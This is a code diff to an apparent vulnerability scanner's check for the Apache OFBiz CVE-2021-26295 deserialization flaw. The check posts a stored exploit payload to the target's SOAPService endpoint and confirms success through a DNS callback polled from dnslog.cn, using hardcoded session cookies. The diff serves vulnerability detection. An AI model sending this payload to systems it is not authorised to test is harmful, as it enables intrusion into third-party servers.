@@ -60,27 +60,45 @@ class ApacheOFBiz():
         }
         def _trans(s):
             return "%s" % ''.join('%.2x' % x for x in s)
-        # OFBiz dns set
-        use_dns = globals.get_value("DNSLOG")
-        change_dns = False
-        if r"dnslog" not in use_dns:
-            change_dns = True
-            globals.set_value("DNSLOG", "dnslog")
-        dns = dns_request()[-16:]
-        dns_data = bytes(dns, encoding="utf8")
-        dns_hex = _trans(dns_data)
-        data = self.payload_cve_2021_26295_poc.replace("RECOMMAND", dns_hex)
-        url = urljoin(self.url, "/webtools/control/SOAPService")
+
+        def dnslog_re(md):
+            headers_dnslog = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3970.5 Safari/537.36',
+                'Host': 'www.dnslog.cn',
+                'Cookie': 'UM_distinctid=1703200149e449-053d4e8089c385-741a3944-1fa400-1703200149f80a; PHPSESSID=jfhfaj7op8u8i5sif6d4ai30j4; CNZZDATA1278305074=1095383570-1581386830-null%7C1581390548',
+                'Accept': '*/*',
+                'Referer': 'http://www.dnslog.cn/',
+                'Accept-Language': 'zh-CN,zh;q=0.9',
+                'Connection': 'close'
+            }
+            dnslog_url = "http://www.dnslog.cn/getrecords.php?t=0.913020034617231"
+            dns = requests.get(dnslog_url, headers=headers_dnslog, timeout=10, verify=False)
+            if md in dns.text:
+                return md
         try:
+            headers_dnslog = {
+                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
+                    'Host': 'www.dnslog.cn',
+                    'Cookie': 'UM_distinctid=1703200149e449-053d4e8089c385-741a3944-1fa400-1703200149f80a; PHPSESSID=jfhfaj7op8u8i5sif6d4ai30j4; CNZZDATA1278305074=1095383570-1581386830-null%7C1581390548',
+                    'Accept': '*/*',
+                    'Referer': 'http://www.dnslog.cn/',
+                    'Accept-Language': 'zh-CN,zh;q=0.9',
+                    'Connection': 'close'
+            }
+            dnslog_api = "http://www.dnslog.cn/getdomain.php?t=0.08025501698741366"
+            dns = requests.post(dnslog_api, headers=headers_dnslog, timeout=10, verify=False)
+            dns = dns.text
+            dns_data = bytes(dns, encoding="utf8")
+            dns_hex = _trans(dns_data)
+            data = self.payload_cve_2021_26295_poc.replace("RECOMMAND", dns_hex)
+            url = urljoin(self.url, "/webtools/control/SOAPService")
             request = requests.post(url, data=data, headers=headers, timeout=self.timeout, verify=False)
-            if dns_result(dns):
+            if dnslog_re(dns):
                 self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                 self.vul_info["vul_payd"] = data
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["prt_info"] = "[dns] [rmi:" + dns + "]"
             verify.scan_print(self.vul_info)
-            if change_dns:
-                globals.set_value("DNSLOG", use_dns)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
         except requests.exceptions.ConnectionError:
